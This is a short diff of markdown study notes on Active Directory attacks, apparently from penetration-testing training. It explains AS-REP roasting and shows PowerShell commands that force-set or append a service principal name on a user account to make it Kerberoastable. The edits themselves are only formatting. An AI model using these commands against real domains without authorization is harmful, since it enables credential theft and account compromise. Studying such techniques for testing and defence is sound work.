@@ -1,5 +1,6 @@
 ### AsReproasting
-__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
+>__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
+
 As-reproasting occurs when a user account has the privilege "_Does not require Pre-Authentication_" enabled. 
 
 - Attackers can send a junk request for authentication, and the KDC will return _TGT_ for users that have Pre-Authentication disabled.
@@ -78,7 +79,7 @@ __Force set SPN__
 Set-DomainObject -Identity support1user 
 -Set @{serviceprincipalname=‘dcorp/whatever1'}
 ```
-__Add extra SPN__
+__Append extra SPN__
 ```powershell
 Set-ADUser -Identity support1user 
 -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
